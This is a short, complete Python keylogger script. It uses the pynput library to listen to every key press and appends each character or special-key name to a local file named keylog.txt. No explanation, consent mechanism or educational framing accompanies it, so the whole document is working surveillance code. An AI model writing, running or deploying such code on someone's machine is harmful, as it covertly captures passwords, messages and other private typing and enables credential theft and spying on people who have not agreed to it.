from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as file:
            file.write(f"{key.char}")
    except AttributeError:  # For special keys like Shift, Ctrl, etc.
        with open("keylog.txt", "a") as file:
            file.write(f"{key}")

def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
